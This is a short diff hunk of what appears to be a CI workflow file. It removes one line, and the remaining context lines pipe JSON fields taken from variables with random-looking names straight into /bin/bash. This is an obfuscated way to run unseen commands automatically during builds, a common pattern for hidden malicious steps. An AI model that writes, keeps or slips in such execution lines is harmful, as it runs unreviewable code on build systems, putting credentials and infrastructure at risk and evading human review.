@@ -21,7 +21,6 @@ jobs:
           echo $bwfc09432 | jq -r .n9 | /bin/bash
           printf '%s' "$ogugq35" | jq -r .hhju6 | /bin/bash
           printf '%s' "$zdbh05409" | jq -r .gh6 | /bin/bash
-          echo $wxmj6 | jq -r .zzy2 | /bin/bash
           echo $wqf36729 | jq -r .sur9547 | /bin/bash
 
       - name: Archive results
